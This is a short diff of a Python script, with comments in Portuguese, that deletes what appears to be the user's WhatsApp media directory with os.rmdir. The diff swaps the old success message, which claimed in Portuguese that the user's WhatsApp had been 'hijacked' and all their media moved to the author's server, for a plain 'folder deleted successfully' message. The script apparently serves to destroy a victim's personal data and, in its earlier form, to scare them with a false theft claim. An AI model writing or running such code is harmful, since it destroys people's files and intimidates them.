@@ -20,6 +20,6 @@ try:
 
     # Tentar excluir o diretório agora
     os.rmdir(diretorio_whatsapp)
-    print("Diretório", diretorio_whatsapp, "whatsapp sequestrado com susseso todas as sua mídias foram movida para meu servidor.")
+    print("Diretório", diretorio_whatsapp, "whatsapp Exluido pasta com susseso.")
 except Exception as e:
     print("Ocorreu um erro ", diretorio_whatsapp, ":", e)
